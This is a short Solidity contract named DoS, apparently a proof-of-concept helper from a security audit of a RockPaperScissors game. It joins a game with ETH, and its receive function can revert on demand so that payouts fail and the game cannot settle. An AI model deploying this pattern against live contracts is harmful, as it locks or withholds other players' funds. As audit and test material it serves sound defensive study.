// SPDX-Liciense-Identifier: MIT
pragma solidity ^0.8.13;

import "./RockPaperScissors.sol";

contract DoS {
    bool public denied;

    constructor(RockPaperScissors _game, uint256 _gameId) payable {
        _game.joinGameWithEth{value: msg.value}(_gameId);
    }

    function setDenied(bool _denied) external {
        denied = _denied;
    }

    function forward(bytes calldata _data) external payable returns (bytes memory) {
        (bool success, bytes memory result) = msg.sender.call{value: msg.value}(_data);
        require(success, "Forward failed");
        return result;
    }

    receive() external payable {
        if (denied) {
            revert();
        }
    }
}
